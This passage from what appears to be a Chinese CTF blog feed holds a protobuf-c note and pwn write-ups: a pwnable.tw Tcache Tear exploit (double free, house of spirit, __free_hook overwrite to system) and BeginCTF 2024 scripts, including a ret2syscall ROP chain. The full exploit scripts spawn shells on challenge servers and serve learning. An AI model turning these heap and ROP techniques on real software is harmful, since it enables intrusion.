class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment"> * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Field value types.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * \see [Scalar Value Types] in the Protocol Buffers documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * [Scalar Value Types]:</span></span><br><span class="line"><span class="comment"> *      https://developers.google.com/protocol-buffers/docs/proto#scalar</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32                         0  */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32                  1  */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes)        2  */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64                         3  */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64                  4  */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes)        5  */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32                6  */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes)      7  */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64                8  */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes)      9  */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float                         A  */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double                        B  */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean                       C  */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type               D  */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string         E  */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence       F  */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message               10  */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><h5 id="本题中对应的注册文件"><a href="#本题中对应的注册文件" class="headerlink" title="本题中对应的注册文件"></a>本题中对应的注册文件</h5><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> actionid=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> msgidx=<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> msgsize=<span class="number">3</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">bytes</span> msgcontent=<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="生成python文件"><a href="#生成python文件" class="headerlink" title="生成python文件"></a>生成python文件</h5><p>生成的文件默认为&lt;文件名_pd2.py&gt;,如ctf_pd2.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --python_out=./ ./ctf.proto</span><br></pre></td></tr></table></figure><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line">message = test_pb2.devicemsg()</span><br><span class="line">message.actionid = <span class="number">1</span></span><br><span class="line">message.msgidx = idx</span><br><span class="line">message.msgsize = size</span><br><span class="line">message.msgcontent = msg</span><br><span class="line">payload = message.SerializeToString()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/%E5%BA%8F%E5%88%97%E5%8C%96/">序列化</category>
      
      
      <comments>http://example.com/2024/03/20/protobuf-c%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-Tcache_Tear</title>
      <link>http://example.com/2024/02/26/pwnable-Tcache-Tear/</link>
      <guid>http://example.com/2024/02/26/pwnable-Tcache-Tear/</guid>
      <pubDate>Mon, 26 Feb 2024 04:42:40 GMT</pubDate>
      
      <description>&lt;p&gt;跟着大佬的wp写的，记录了一些收获和见解&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>跟着大佬的wp写的，记录了一些收获和见解</p><span id="more"></span><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/13/tcache/">和媳妇一起学Pwn 之 Tcache Tear | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://cloud.tencent.com/developer/article/2063667">[pwnable.tw] Tcache tear — 利用bss构造堆块的地址泄露技巧-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p>先查看一下libc版本，2.27版本，在2.26版本的时候添加了tcache，虽然tcache提高了性能，但是却舍弃了很多检查，就好比double free</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so| grep <span class="string">&quot;GNU&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/pwnable-tcache_tear-1.png" alt="pwnable-tcache_tear-1"></p><p>设置本地调试的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter [ld.so路径] --set-rpath [libc所在目录] [elf文件]</span><br></pre></td></tr></table></figure><p>比如我是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so --set-rpath ~/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ ./pwn</span><br></pre></td></tr></table></figure><h5 id="利用一：tcache-dup任意地址写"><a href="#利用一：tcache-dup任意地址写" class="headerlink" title="利用一：tcache dup任意地址写"></a>利用一：tcache dup任意地址写</h5><p>在fastbin中，我们不能连续释放同一个堆块达到double free的目的，要达到double free的目的，我们需要如下步骤：先申请两个堆块，释放第一个堆块，再释放第二个堆块，然后再次释放第一个堆块，从而double free</p><p>在此之前我对double free表示不理解，因为没有接触过利用方法，不过写完这道题后我对double free的利用方法就有了一个大致的方向</p><p>double free后，fastbin中的链式结构如下，由此可以看到，a和b形成了一个环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; a -&gt; b -&gt; a</span><br></pre></td></tr></table></figure><p>此时，当我们再次申请一个和a等大的chunk时，fastbin如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; b -&gt; a</span><br></pre></td></tr></table></figure><p>如果我们在申请的同时在a中写入内容，假设我们输入一个地址，那么fastbin就会变成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; b -&gt; a -&gt; [输入的地址]</span><br></pre></td></tr></table></figure><p>那么此时我们再申请掉2次，在第三次申请的时候就可以申请到我们输入的地址的内存空间，从而对指定的地址的内容进行改写</p><p>所以double free的模拟代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,addr)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,data)</span><br></pre></td></tr></table></figure><p>但是在2.27版本的tcache中，我们不用这么麻烦，可以直接连续释放同一个chunk 2次，即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,addr)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,data)</span><br></pre></td></tr></table></figure><h5 id="利用二：伪造大堆块泄露libc地址（house-of-spirit）"><a href="#利用二：伪造大堆块泄露libc地址（house-of-spirit）" class="headerlink" title="利用二：伪造大堆块泄露libc地址（house of spirit）"></a>利用二：伪造大堆块泄露libc地址（house of spirit）</h5><p>任意地址写有了，就要尝试如何泄露地址了</p><p>house of spirit的利用思路如下</p><ol><li>利用任意地址写，在bss段构造大小超出0x408的伪堆块</li><li>然后free掉，使其进入unsorted bin中</li><li>利用info函数，读取其内容即可</li></ol><p>我们先在输入name的时候构造好大堆块的前0x10个字节，然后利用地址任意写再构造2个堆块，大堆块用于泄露libc地址，小堆块则用于满足堆块的格式，至少是2个，因为在free的时候，会对当前堆块的后面的堆块进行检查</p><h5 id="计算libc偏移"><a href="#计算libc偏移" class="headerlink" title="计算libc偏移"></a>计算libc偏移</h5><p>我比较想说的还是这个偏移的计算，我在网上搜索了很多文章，但是没看到有人讲这个偏移是怎么算的，所以我在这里记录一下我是如何计算偏移的(我的方法可能比较笨)</p><p>在free伪造的大堆块后下断点，可以看到此时0x602070中的内容(也就是大堆块的内容)已经变成了unsorted bin的地址0x00007fe0c8324ca0，然后我们打印出libc中puts的偏移0x809c0，然后通过puts的真实地址来计算偏移，即：0x7fe0c8324ca0 - (0x7fe0c7fb99c0 - 0x809c0) &#x3D; 0x3ebca0</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-tcache_tear-3.png" alt="pwnable-tcache_tear-3"></p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-tcache_tear-2.png" alt="pwnable-tcache_tear-2"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/tcache_tear&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10207</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/tcache_tear&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    bss_name = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">    name = p64(<span class="number">0</span>) + p64(<span class="number">0x511</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0x68</span>, p64(bss_name+<span class="number">0x510</span>))</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, payload)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x78</span>, <span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0x78</span>, p64(bss_name+<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x78</span>, <span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x78</span>, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#free largechunk and get libc addr</span></span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    p.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">b&quot;system&quot;</span>]</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">b&quot;__free_hook&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;system_addr:&quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>, <span class="string">b&quot;e&quot;</span>*<span class="number">8</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0x58</span>, p64(free_hook))</span><br><span class="line">    add(<span class="number">0x58</span>, <span class="string">b&quot;ffff&quot;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>, p64(system))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/pwnable-tw/">pwnable.tw</category>
      
      
      <category domain="http://example.com/tags/tcache-dup/">tcache dup</category>
      
      <category domain="http://example.com/tags/house-of-spirit/">house of spirit</category>
      
      
      <comments>http://example.com/2024/02/26/pwnable-Tcache-Tear/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>BeginCTF 2024 Pwn部分wp</title>
      <link>http://example.com/2024/02/06/BeginCTF-2024-Pwn%E9%83%A8%E5%88%86wp/</link>
      <guid>http://example.com/2024/02/06/BeginCTF-2024-Pwn%E9%83%A8%E5%88%86wp/</guid>
      <pubDate>Tue, 06 Feb 2024 05:29:53 GMT</pubDate>
      
      <description>&lt;p&gt;本Pwn小白实力不允许，只写出了几道稍微简单点的&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本Pwn小白实力不允许，只写出了几道稍微简单点的</p><span id="more"></span><h3 id="one-byte"><a href="#one-byte" class="headerlink" title="one_byte"></a>one_byte</h3><p>溢出只能覆盖返回地址的一个字节，利用溢出，修改返回地址返回主函数继续读出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&quot;your gift: &quot;</span>)</span><br><span class="line">        flag += p.recv(<span class="number">1</span>).decode()</span><br><span class="line">        pd = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">17</span> + <span class="string">b&#x27;\x63&#x27;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;result?&quot;</span>,pd)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="gift-rop"><a href="#gift-rop" class="headerlink" title="gift_rop"></a>gift_rop</h3><p>gadget都留着，直接ret2syscall就可以get shell，因为关闭了标准输出和标准错误，重定向就可以看到输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/gift_rop&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/gift_rop&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x00000000004c50f0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f2f</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000409f9e</span></span><br><span class="line">syscall = <span class="number">0x401CE4</span></span><br><span class="line">pop_rdx_rbx =<span class="number">0x000000000047f20b</span></span><br><span class="line">ret = <span class="number">0x000000000043d1d0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040239e : xor eax, eax ; ret</span></span><br><span class="line"><span class="string">0x00000000004019d6 : add eax, 1 ; ret</span></span><br><span class="line"><span class="string">0x0000000000471268 : add eax, 2 ; ret</span></span><br><span class="line"><span class="string">0x0000000000471281 : add eax, 3 ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">xor_eax = <span class="number">0x000000000040239e</span></span><br><span class="line">add_eax_3= <span class="number">0x0000000000471281</span></span><br><span class="line">add_eax_2= <span class="number">0x0000000000471268</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment">#execve 59   eax = 59  rdi = &quot;/bin/sh\x00&quot;  rsi = 0  rdx = 0</span></span><br><span class="line">    pd = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    pd += p64(pop_rdi) + p64(binsh)</span><br><span class="line">    pd += p64(pop_rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(xor_eax)</span><br><span class="line">    pd += p64(add_eax_3) * <span class="number">19</span></span><br><span class="line">    pd += p64(add_eax_2)</span><br><span class="line"></span><br><span class="line">    pd += p64(syscall)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">b&quot;checkin problem.&quot;</span>,pd)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> 